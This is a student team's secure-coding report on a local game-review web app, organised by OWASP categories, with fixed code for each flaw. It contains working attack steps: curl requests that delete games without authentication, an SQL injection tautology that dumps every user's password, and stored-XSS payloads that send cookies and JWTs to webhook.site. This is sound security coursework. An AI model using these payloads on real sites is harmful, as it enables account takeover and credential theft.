# ST2515 — Secure Coding Project

## Secure Vulnerability Analysis Report

**Team Members:**
- Nachiketh — A01 Broken Access Control + A09 Logging & Monitoring
- Mike — A03 Injection
- Keefe — A07 Identification & Authentication Failures
- Sitt — A04 Insecure Design

**Submission Date:** 29 June 2026

---

## Category Selection Rationale

### Why A01 — Broken Access Control over A02 — Cryptographic Failures

Both A01 and A02 are present in the codebase, but A01 was chosen for detailed analysis because:

| Factor | A01 — Broken Access Control | A02 — Cryptographic Failures |
|--------|----------------------------|------------------------------|
| **Exploitability** | Trivially exploitable with single `curl` commands — no auth needed | Requires intercepting traffic or extracting tokens; less visual impact |
| **Demo strength** | Add/delete games live, dump all user passwords in browser | Password comparison, JWT decode are harder to demonstrate visually |
| **Code surface** | 4+ unprotected endpoints, clear middleware omission | Overlaps heavily with A07 (plain-text passwords, weak JWT secret) |
| **OWASP ranking** | #1 on OWASP Top 10 2021 | #2 on OWASP Top 10 2021 |
| **Independent findings** | A01 stands alone as its own category | Most A02 issues in this app are also A07 issues |

The app has trivially exploitable A01 flaws:
- `POST /game`, `DELETE /game/:id` — zero auth required, anyone can add/delete games
- `GET /users` — returns every user record including plain-text passwords with no authentication

A02 is weaker here because the crypto failures (plain-text passwords, weak JWT secret) overlap heavily with A07 and are harder to demonstrate visually.

---

## A01 — Broken Access Control (Detailed)

### Finding 1: Missing Authentication on Admin Endpoints

**Type of flaw:** Broken Access Control — Missing authorization checks on server-side endpoints that perform privileged operations.

**Location:**
- `Assignment/BackEndServer/controller/app.js` lines 337, 387, 435, 529

**Vulnerable code snippet:**

```javascript
// Line 337 — No verifyToken middleware
app.post('/category', function (req, res) { ... });

// Line 387 — No verifyToken middleware
app.post('/platform', function (req, res) { ... });

// Line 435 — No verifyToken middleware
app.post('/game', upload.single('game_image'), function (req, res) { ... });

// Line 529 — No verifyToken middleware
app.delete('/game/:id', function (req, res) { ... });
```

**How it can be exploited:**
An unauthenticated attacker can send direct HTTP requests to these endpoints without any token or session. For example, deleting any game:

```bash
curl -X DELETE http://localhost:8081/game/1
```

Or adding a new game without being logged in:

```bash
curl -X POST http://localhost:8081/game \
  -F "title=Malicious Game" \
  -F "game_description=Hacked" \
  -F "year=2026" \
  -F "game_image=@exploit.jpg"
```

Only a single endpoint in the entire API (`/CheckRole` at line 57) uses the `verifyToken` middleware. All other endpoints are publicly accessible.

**Tools used:** curl, Postman, browser developer tools

**Recommendation:**
Apply the `verifyToken` middleware to all admin endpoints. Only authenticated users with the `Admin` role should be allowed to create, update, or delete resources.

**Fixed code:**

```javascript
// Add verifyToken + role check middleware
function requireAdmin(req, res, next) {
    if (req.type !== 'Admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    next();
}

// Protected endpoints
app.post('/category', verifyToken, requireAdmin, function (req, res) { ... });
app.post('/platform', verifyToken, requireAdmin, function (req, res) { ... });
app.post('/game', verifyToken, requireAdmin, upload.single('game_image'), function (req, res) { ... });
app.delete('/game/:id', verifyToken, requireAdmin, function (req, res) { ... });
```

**Best Secure Coding Practice:**
Apply the principle of least privilege. Every endpoint should authenticate the requester before processing. Use middleware consistently rather than duplicating auth checks inside route handlers. Default-deny pattern — all endpoints are locked unless explicitly marked public.

---

## A01 — Broken Access Control (Brief)

### Finding 2: GET /users Exposes All User Records

**Type of flaw:** Broken Access Control — Sensitive data exposure via an unauthenticated endpoint.

**Location:** `Assignment/BackEndServer/controller/app.js` line 219
**Model:** `Assignment/BackEndServer/model/users.js` lines 16–47

**Vulnerable code snippet:**

```javascript
// app.js line 219
app.get('/users', function (req, res) {
    userDB.getUser(function (err, results) { ... });
});
```

```javascript
// users.js lines 28-29 — password column included in query
var getUserSql = `select userid, username, email, password, type, profile_pic_url,
                    DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at FROM users`;
```

**Impact:** Any unauthenticated visitor can retrieve all registered users' data, including their plain-text passwords, by visiting `http://localhost:8081/users`. This violates confidentiality of user credentials.

**Fixed code:**

```javascript
// Remove password from SELECT query
var getUserSql = `select userid, username, email, type, profile_pic_url,
                    DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at FROM users`;
```

Additionally, protect the endpoint with `verifyToken` and restrict to admin users only.

**Best Secure Coding Practice:** Never expose internal user IDs or credentials in API responses. Apply the principle of data minimization — only return fields the client legitimately needs.
--- 
## A03 — Injection (Detailed)

### Finding 1: SQL Injection in `GET /users/:userid`

**Type of flaw:** SQL Injection — unsafe string interpolation allows attacker-controlled input to manipulate the database query structure.

**Location:**
- `Assignment/BackEndServer/controller/app.js` lines 308–320
- `Assignment/BackEndServer/model/users.js` lines 87–103

**Vulnerable code snippet:**

```javascript
// controller/app.js — userid taken from URL with no validation
app.get('/users/:userid', function (req, res) {
    var userid = req.params.userid;

    userDB.getUserByUserid(userid, function (err, results) {
        if (err) {
            console.log(err);
            res.status(500).send(err);
        } else {
            res.status(200).send(results);
        }
    });
});
```

```javascript
// model/users.js — userid dropped directly into the SQL string
var getUserByUserIDSql = `select userid, username, email, password, type, profile_pic_url,
                            DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at
                          FROM users where userid = ${userid};`;
```

**Why this is vulnerable:**
The `userid` value from the URL path parameter is inserted directly into the SQL string using a template literal (`${userid}`) without any parameterization, type validation, or sanitization. The value is treated as raw SQL text, so an attacker can supply SQL syntax and alter the structure of the query. The endpoint is also entirely public — it requires no authentication token.

**How it can be exploited:**

**Step 1 — Confirm the injection point (force a SQL error):**

Sending a single quote breaks the SQL syntax. The server returns a raw MySQL error, confirming input is interpreted as SQL:
```bash
curl "http://localhost:8081/users/'"
```
Expected response: HTTP 500 with a MySQL syntax error leaking internal query structure.

**Step 2 — Dump all users with a tautology:**
```bash
curl "http://localhost:8081/users/1%20OR%201=1"
```
Resulting SQL:
```sql
SELECT userid, username, email, password, type, profile_pic_url, ...
FROM users WHERE userid = 1 OR 1=1;
```
Every row is returned — including all plain-text passwords.

**Step 3 — Target a specific account by email:**
```bash
curl "http://localhost:8081/users/1%20OR%20email='admin@example.com'"
```

**Step 4 — Full account takeover chain:**

With passwords from Step 2, the attacker replays credentials against the login endpoint:
```bash
curl -X POST http://localhost:8081/users/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"dumped_password"}'
```
The server returns a valid JWT token granting full admin access.

**Impact:**
- All user records including plain-text passwords exposed to any unauthenticated attacker
- Immediate account takeover without any cracking step
- Admin credentials may be among the exposed records, enabling full application compromise
- Breach of user confidentiality

**Tools used:** Manual code review, browser navigation to injected URL, Postman for structured payload testing

**Recommendation:**
Use a parameterized query. Also protect the endpoint with authentication middleware and remove `password` from the `SELECT` statement.

**Fixed code:**

```javascript
// model/users.js — parameterized query, password removed from SELECT
var getUserByUserIDSql = `
    SELECT userid, username, email, type, profile_pic_url,
           DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at
    FROM users
    WHERE userid = ?;
`;
dbConn.query(getUserByUserIDSql, [userid], function (err, results) {
    dbConn.end();
    if (err) { return callback(err, null); }
    return callback(null, results);
});
```

```javascript
// controller/app.js — validate userid is an integer, add auth middleware
app.get('/users/:userid', verifyToken, function (req, res) {
    var userid = parseInt(req.params.userid, 10);
    if (isNaN(userid)) {
        return res.status(400).json({ error: 'Invalid user ID' });
    }
    userDB.getUserByUserid(userid, function (err, results) {
        if (err) { res.status(500).send('Internal server error'); }
        else { res.status(200).send(results); }
    });
});
```

**Best Secure Coding Practices:**
- Always use parameterized queries or prepared statements. Never interpolate user input into SQL strings.
- Validate and type-check all inputs at the controller layer before they reach the model. A `userid` should always be coerced to an integer and rejected if not a valid number.
- Apply authentication middleware to endpoints that return user data and enforce that a user can only access their own record unless they hold the Admin role.
- Remove sensitive columns such as `password` from `SELECT` statements in any query whose results are sent to the client.

---

## A03 — Injection (Brief)

### Finding 2: Stored XSS via Review Content Rendered into `innerHTML`

**Type of flaw:** Stored Cross-Site Scripting (XSS) — user-supplied review content is persisted to the database and later inserted into the DOM without sanitization, allowing injected scripts to execute in every visitor's browser.

**Location:**
- `Assignment/FrontEndServer/Public/newGame-Detail.html` lines 92–103 (`renderReviews` function)
- `Assignment/BackEndServer/controller/app.js` — `POST /users/:uid/game/:gid/review` (no input validation on `content`)

**Vulnerable code snippet:**

```javascript
// newGame-Detail.html — renderReviews()
function renderReviews(reviews) {
    reviews.forEach(r => {
        const div = document.createElement('div');
        div.innerHTML = `
            <strong>${r.username || 'User'}</strong>
            <div class="muted small">${r.created_at || ''} • Rating: ${r.rating || ''}</div>
            <p class="mt-2">${r.content || ''}</p>
        `;
        out.appendChild(div);
    });
}
```

`r.content` is retrieved from the database and inserted directly into `innerHTML` with no escaping. Any HTML or script tags stored in the database will be interpreted and executed by the browser.

**Impact:** An attacker submits a review via Postman with escalating payloads in the `content` field:

**Basic confirmation:**
```json
{ "content": "<script>alert('XSS')</script>", "rating": 5 }
```

**Cookie steal:**
```json
{ "content": "<img src=x onerror=\"fetch('https://webhook.site/YOUR-ID?c='+document.cookie)\">", "rating": 5 }
```

**JWT token steal (most impactful):**
```json
{ "content": "<img src=x onerror=\"fetch('https://webhook.site/YOUR-ID?t='+localStorage.getItem('Token'))\">", "rating": 5 }
```

The JWT steal is the strongest demo: open [webhook.site](https://webhook.site), paste your URL into the payload, submit the review, then visit the game page logged in as a victim in another tab. The victim's JWT arrives at webhook.site in real time — paste it into Postman as `Authorization: Bearer <token>` for immediate account takeover. Because the payload is stored in the database, this is a **persistent** attack affecting every future visitor.

**Recommendation:**
Replace `innerHTML` with DOM methods that set text via `textContent`. Unlike `innerHTML`, `textContent` never interprets its value as HTML — injected tags cannot execute regardless of what the database contains.

**Fixed code:**

```javascript
// Updated renderReviews — textContent used for all dynamic values
function renderReviews(reviews) {
    const out = document.getElementById('reviewDisplaySection');
    out.innerHTML = '';
    reviews.forEach(r => {
        const div = document.createElement('div');
        div.className = 'card p-3 mb-3';

        const wrapper = document.createElement('div');
        wrapper.className = 'd-flex gap-3';

        const img = document.createElement('img');
        img.src = 'data:image/jpeg;base64,' + (r.profile_pic_url || '');
        img.style.cssText = 'width:64px;height:64px;object-fit:cover;border-radius:50%';
        img.alt = 'user';

        const info = document.createElement('div');

        const strong = document.createElement('strong');
        strong.textContent = r.username || 'User';

        const meta = document.createElement('div');
        meta.className = 'muted small';
        meta.textContent = (r.created_at || '') + ' • Rating: ' + (r.rating || '');

        const content = document.createElement('p');
        content.className = 'mt-2';
        content.textContent = r.content || '';

        info.appendChild(strong);
        info.appendChild(meta);
        info.appendChild(content);
        wrapper.appendChild(img);
        wrapper.appendChild(info);
        div.appendChild(wrapper);
        out.appendChild(div);
    });
}
```

With this fix, a payload like `<img src=x onerror="...">` stored in `r.content` is displayed as literal text — the browser never parses it as HTML.

**Best Secure Coding Practices:**
- Use `textContent` instead of `innerHTML` whenever displaying plain text. It is safe by default and requires no escaping — the browser cannot interpret anything set via `textContent` as markup.
- Treat all data retrieved from the database as untrusted. It passed through user input at some point and may contain malicious content.
- Validate and sanitize user input at the backend before storage. The review submission endpoint should strip or reject HTML tags before writing to the database, providing defence-in-depth on top of the frontend fix.
- Implement a Content Security Policy (CSP) header as an additional layer so that even a missed fix cannot allow scripts to exfiltrate data.


--- 
## A04 — Insecure Design (Detailed)
(Content to be filled by Sitt)


--- 
## A04 — Insecure Design (Brief)
(Content to be filled by Sitt)


--- 
## A07 — Identification & Authentication Failures (Detailed)
### Finding 1: Plain-text Password Storage and Lack of Hashing ###

Type of flaw: Identification & Authentication Failures — Insecure credential storage allowing unauthorized access upon database compromise.

- Location: - Assignment/BackEndServer/model/users.js (Inside registration and login query handlers)

<img width="536" height="233" alt="image" src="https://github.com/user-attachments/assets/637df0b0-6a13-4145-997b-93c8f948b0f2" />

The password is being saved into the database by the SQL workbench, we can see that the password is not properly hashed and displayed in plain text

<img width="455" height="230" alt="image" src="https://github.com/user-attachments/assets/8fee31e8-c8a8-4672-95df-90917641f237" />

## How It Can Be Exploited Specifically
An attacker can specifically exploit this plain-text credential storage vulnerability through direct identification and authentication failures within the application lifecycle:

1. A07 Credential Harvesting: An attacker targets the authentication infrastructure directly. If the application logs account information insecurely, exposes unencrypted database backup files, or fails to implement rate-limiting on login forms, an attacker can harvest user credentials.

2. Cleartext Acquisition: Because the application stores user passwords in human-readable plain text without wrapping them in an adaptive cryptographic hashing function (like bcrypt), the attacker reads the raw credentials immediately upon gaining access to the data layer. The attacker does not need to spend time running brute-force hardware arrays to crack hashes.

3. Authentication UI Replay: The attacker maps these cleartext identity strings directly to the public-facing application frontend.

Below is the step-by-step demonstration of how a harvested account credential is replayed to exploit the system:

- Step 1: Gain Access to Stored Credentials
The attacker targets the application's underlying infrastructure or active transit paths to locate a vulnerable data source. This typically involves identifying secondary flaws like an unparameterized database query (SQL Injection), discovering unencrypted database backup files (.sql or .bak) left exposed in public web roots, or locating verbose backend logs.

- Step 2: Extract Plain-Text Credentials
Upon locating the storage medium, the attacker reads the raw credentials immediately. Because the application fails to process passwords through an adaptive, one-way cryptographic hash function (such as bcrypt), the attacker completely bypasses the computationally expensive "cracking" or brute-forcing phase.

### Registration Ingestion Baseline
<img width="959" height="469" alt="image" src="https://github.com/user-attachments/assets/1a965573-3916-48bc-80db-a430d298f451" />

The front-end account creation interface sends raw, unhashed payloads to the backend /users endpoint upon registration. The server registers the account successfully and returns an identifier, but fails to encrypt or hash the incoming password string before persistence.

- Step 3: Identify Valid Accounts
The attacker parses the exposed dataset to select valid, active credential pairs. Simultaneously, because the frontend application replicates this plain-text data into the client's browser profile, the attacker can use a client-side vector like Cross-Site Scripting (XSS) to automatically harvest active credentials from other users' browser sessions.

### Client-Side Evidence (Browser Local Storage):
<img width="959" height="446" alt="image" src="https://github.com/user-attachments/assets/1c32503e-d787-42c4-ab4d-17f1e1193c35" />

Frontend session management state showing that the user's raw password (1) is explicitly written to persistent browser localStorage under the key logPassword

## Identify code snippet exposing the vulnerability

The authentication weakness spans both the frontend client-side session management and backend API responses. The following code snippets demonstrate the insecure handling of credentials and authentication data.

---

### 1. Frontend Client-Side: Insecure Credential Storage (localStorage)

The application stores sensitive authentication data in browser localStorage when the "Remember Me" feature is enabled.

```javascript
localStorage.setItem('logEmail', email);
localStorage.setItem('logPassword', pwd);
```

#### Security Issue:
- Password is stored in plain text in the browser
- Accessible via JavaScript
- Can be stolen via XSS attacks
- Not secure for persistent authentication storage

### 2. Registration sends raw password to backend

The frontend sends the password directly to the backend /users endpoint without encryption.

<img width="551" height="301" alt="image" src="https://github.com/user-attachments/assets/0922ec36-a6c4-41d6-8807-787a23c84c7e" />

``` javascript
async function registerUser() {

    const username = document.getElementById('username').value.trim();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const type = document.getElementById('type').value;
    const profile_pic_url = document.getElementById('profile_pic_url').value;

    const res = await fetch('http://localhost:8081/users', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            username,
            email,
            password,
            type,
            profile_pic_url
        })
    });
}
```

#### Security Issue:
- Password is transmitted in raw form
- No client-side encryption or hashing
- Relies fully on backend security (which was initially missing hashing)

### 3. Login API response exposes sensitive authentication data

## Impact

Passwords are stored in plain text within the database instead of being hashed before storage. If an attacker gains access to the database through a data breach, misconfiguration, or another vulnerability, all user passwords would be immediately exposed.

### Potential Consequences

- Unauthorized access to user accounts.
- Credential stuffing attacks against other services where users reuse the same password.
- Exposure of sensitive user information and application data.
- Potential privilege escalation if administrator credentials are compromised.
- Non-compliance with security best practices outlined in OWASP A07:2021 – Identification and Authentication Failures.

### Tools and Methods Used to Test the Web System

The following tools were used to identify and verify security vulnerabilities within the application.

---

####  MySQL Workbench

**Purpose:**  
Used to inspect and validate database-level storage of user credentials.

**Testing Activities:**
- Queried the `users` table to examine how passwords were stored.
- Verified whether passwords were stored in plain text or hashed format.
- Checked newly inserted user records after registration.
- Compared database records before and after implementing password hashing.

**Evidence:**

The screenshot below shows how the password storage was tested by creating or modifying user records and inspecting the resulting values stored in the database. This was used to verify whether passwords were stored in plain text or securely hashed.

<img width="485" height="232" alt="MySQL Workbench Password Verification" src="https://github.com/user-attachments/assets/59c0f3cd-9e79-4ad1-a339-38a39dad8a75" />

---

#### Browser Developer Tools (Chrome DevTools)

**Purpose:**  
Used to inspect client-side storage and analyse authentication-related data exposure.

**Testing Activities:**
- Inspected **Application → Local Storage** to identify sensitive data stored in the browser.
- Verified whether user credentials, session information, or authentication tokens were stored insecurely.
- Monitored the **Network** tab during login and registration requests.
- Analysed API requests and responses for potential exposure of sensitive information.

**Evidence:**
<img width="959" height="461" alt="image" src="https://github.com/user-attachments/assets/60543c09-f509-4fc1-a745-a87bf77ffc0f" />

---

#### Postman

<img width="557" height="303" alt="image" src="https://github.com/user-attachments/assets/3478ab6d-6a8d-41a1-8106-acbc744f35da" />

**Purpose:**  
Used to test and verify backend authentication and user-related API endpoints independently of the frontend application.

**Testing Activities:**
- Sent HTTP requests directly to `/users/login` and `/users` endpoints
- Verified whether passwords are transmitted in plain text during login and registration
- Checked API responses for exposed sensitive data such as JWT tokens and user details
- Validated server-side handling of authentication requests without frontend interference
- Confirmed whether authentication controls rely on backend validation or client-side input


---

---

### Risk Assessment

**Risk Level:** High  

Storing passwords in plain text is a critical security vulnerability. If the database is compromised, attackers can directly access user credentials without needing to perform any cracking or decryption. This significantly increases the severity of the breach, potentially leading to unauthorized account access and data exploitation.

---

### Recommendation

To protect user passwords, they should never be stored in plain text. Instead, passwords should be secured using modern hashing algorithms such as **bcrypt** or **Argon2**.

These hashing algorithms convert passwords into irreversible hashed values (a fixed string of characters), ensuring that:

- The original password cannot be retrieved from the stored value  
- Even if the database is exposed, user credentials remain protected  
- Each password is uniquely hashed using a salt, making brute-force attacks much harder  

#### Example:

Instead of storing:
```bash
password123
```

The system should store a hashed value such as:
```bash

$2a$10$N9qo8uLOickgx2ZMRZoMye...

```

---

### Impact of Fix

Implementing password hashing significantly improves system security by:
- Preventing direct credential theft from database leaks  
- Reducing risk of account takeover  
- Aligning with industry security standards (OWASP best practices)  

--- 

### Example of Fix

To mitigate the risk of password exposure, the application should implement **bcrypt hashing** for password storage and authentication. Instead of storing passwords in plain text, passwords are hashed before being saved to the database, making them significantly more difficult for attackers to obtain and misuse.

The figure below shows an example of the changes made to incorporate bcrypt hashing into the application, where passwords are hashed before being stored in the database.

<img width="291" height="59" alt="image" src="https://github.com/user-attachments/assets/36f19f7b-4005-4d8f-9902-a006658c111e" />

**Fixed code:**
```bash
insertUser: function (username, email, password, type, profile_pic_url, callback) {

    var dbConn = db.getConnection();

    dbConn.connect(function (err) {

        if (err) {
            return callback(err, null);
        }

        bcrypt.hash(password, saltRounds, function (err, hash) {

            if (err) {
                dbConn.end();
                return callback(err, null);
            }

            var insertUserSql =
                "INSERT INTO users(username,email,password,type,profile_pic_url) VALUES(?,?,?,?,?)";

            dbConn.query(
                insertUserSql,
                [username, email, hash, type, profile_pic_url],
                function (err, results) {

                    dbConn.end();

                    if (err) {
                        return callback(err, null);
                    }

                    return callback(null, results);
                }
            );
        });
    });
}

```

## A07 — Identification & Authentication Failures (Brief)
### Finding 2: Hardcoded / Weak JWT Secret Key ###

Type of flaw: Identification & Authentication Failures — Weak session token signing mechanism allowing token forging due to hardcoded credentials.

Location: Assignment/BackEndServer/config/config.js lines 1–2 (or your exact config file path)

<img width="452" height="78" alt="image" src="https://github.com/user-attachments/assets/c9392fb8-ed5d-44b6-a681-11298581a089" />

## Reccommendation
To mitigate this risk, cryptographic secrets must be completely decoupled from the application source code.

- Utilize Environment Variables: Move the JWT secret key out of config.js and into an external environment file (e.g., a .env file) that resides strictly on the local hosting environment.
- Update Source Control Configuration: Ensure that the .env file is explicitly listed in the project's .gitignore file to prevent it from ever being accidentally committed to the version control repository.
- Implement a Secret Management System: For production environments, consider leveraging a dedicated secret management service (such as AWS Secrets Manager, HashiCorp Vault, or Azure Key Vault) to dynamically inject sensitive credentials at runtime.

## Remediation Example
1. Create a .env file (Stored locally, NEVER committed):
<img width="953" height="545" alt="image" src="https://github.com/user-attachments/assets/e11246d8-efc1-4593-9ad9-edb566053e72" />

```bash
# =========================
# APPLICATION CONFIG
# =========================
PORT=8081

# =========================
# DATABASE CONFIG
# =========================
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=your_database_password
DB_NAME=assignment2

# =========================
# JWT AUTHENTICATION
# =========================
JWT_SECRET=Assignment2key

# =========================
# SECURITY / ENVIRONMENT
# =========================
NODE_ENV=development
```
2. Update config.js to read from the environment:
<img width="935" height="518" alt="image" src="https://github.com/user-attachments/assets/d9ea0934-7a63-41d2-9122-e183eb918cc6" />

```bash
require('dotenv').config();

module.exports.key = process.env.JWT_SECRET;
```

3. Add .gitignore to prevent secret leakage

To ensure sensitive configuration files are not exposed in version control, the .env file must be excluded from the repository using .gitignore.
``` bash
# Environment variables
.env

# Dependency folders
node_modules/

# Logs
logs
*.log

# OS files
.DS_Store
```

### Impact of Fix

Implementing secure secret management improves system security by:

Preventing JWT secret exposure through version control leaks
Protecting authentication integrity
Reducing risk of credential compromise
Ensuring sensitive environment variables are not publicly accessible
Aligning with OWASP A07:2021 security best practices

## A07 — Identification & Authentication Failures (Optional)
### Finding 3: Session Hijacking via Client-Side Token Substitution ###

#### Overview

This finding describes a security weakness in the application’s session management mechanism. The application stores JWT authentication tokens in localStorage, which introduces risks related to token exposure, manipulation, and session reuse.

Although JWT itself is secure when properly signed, improper storage and handling on the client side weakens overall session security.

#### Affected Component
Frontend authentication module
Browser localStorage session storage
API requests using JWT Authorization headers
#### Technical Description

The application stores authentication data in the browser after login:

localStorage.setItem('Token', token);
localStorage.setItem('user', JSON.stringify(user));

These values are used to maintain user sessions and authenticate API requests.

Because localStorage is accessible via browser developer tools and JavaScript execution context, stored tokens can be:

Viewed
Modified
Replaced
Extracted by malicious scripts
#### Security Issue

The system relies on client-side stored JWT tokens as a session identifier.

If an attacker obtains a valid token, it can be reused in another session until expiration. This is commonly referred to as:

Session Token Replay / Token Substitution (Session Hijacking Concept)

#### Security Weaknesses Identified
1. Insecure Token Storage

Storing tokens in localStorage exposes them to:

Browser DevTools access
Cross-Site Scripting (XSS) attacks
Malicious browser extensions
2. Weak Trust in Client-Side Data

The application stores user session data locally:

const user = JSON.parse(localStorage.getItem('user'));

This introduces risk if frontend logic relies on this data for authorization decisions instead of backend validation.

3. Missing Secure Cookie Controls

The application does not use:

HttpOnly cookies
Secure cookie flags
SameSite protection

This increases exposure of authentication credentials.

#### Testing Methodology
Browser Developer Tools
Inspected localStorage
Verified JWT token and user object storage
Manually modified stored values to observe session behavior
Postman API Testing

Tested endpoints:

GET /users
GET /CheckRole

Example request:

GET /CheckRole HTTP/1.1
Authorization: Bearer <JWT_TOKEN>

Observations:

Endpoints rely on JWT for authentication
Access control depends on backend validation of token claims
Frontend Network Inspection

Monitored requests using DevTools:

fetch('http://localhost:8081/CheckRole', {
  headers: {
    Authorization: `Bearer ${token}`
  }
});

Confirmed that authentication relies on client-supplied tokens.

#### Impact
Potential session reuse if tokens are exposed
Risk of account impersonation in compromised environments
Weak separation between client-side and server-side security logic
Increased exposure to XSS-based token theft

Risk Level: Medium

#### Recommendations

- 1. Use HttpOnly Cookies

Store JWTs in:

HttpOnly cookies
Secure flag enabled (HTTPS only)
SameSite policy set to Strict or Lax

- 2. Avoid localStorage for Sensitive Data

Do not store:

JWT tokens
Authorization-critical user data

- 3. Enforce Backend Authorization

Ensure:

Every protected route validates JWT properly
Role checks are performed server-side
No reliance on frontend user state for access control

- 4. Implement XSS Protections
Input sanitization for all user inputs
Implement Content Security Policy (CSP)
Avoid unsafe DOM usage such as innerHTML

#### Conclusion

The application’s authentication system is functional but exposed to risks due to insecure token storage in localStorage. While JWT integrity remains valid, the current implementation increases the attack surface for token theft and session reuse.

Improving storage mechanisms and enforcing stricter backend authorization will significantly enhance overall security posture.


